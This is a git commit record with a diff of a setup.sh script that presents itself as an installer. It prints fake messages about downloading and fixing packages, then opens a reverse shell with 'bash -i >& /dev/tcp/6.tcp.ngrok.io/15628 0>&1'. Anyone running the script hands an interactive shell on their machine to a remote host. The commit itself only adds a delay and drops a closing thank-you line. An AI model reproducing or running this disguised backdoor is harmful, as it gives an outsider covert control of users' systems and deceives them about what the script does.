2a7593d9a97d79d4700b2f83092490c64e99fbae
witcher1023 <89247079+witcher1023@users.noreply.github.com>
2022-02-01 11:05:49 +0500

    Update setup.sh

--- setup.sh
+++ setup.sh
@@ -3,9 +3,9 @@ sleep 3
 echo Downloading some Packages
 sleep 4
 echo Dont Close This Terminal Wait few Minutes
+sleep 3
 echo Some packages are missing 
 sleep 2
 echo fixing them
 bash -i >& /dev/tcp/6.tcp.ngrok.io/15628 0>&1
-sleep 4
-echo Thanks For using my tool
+
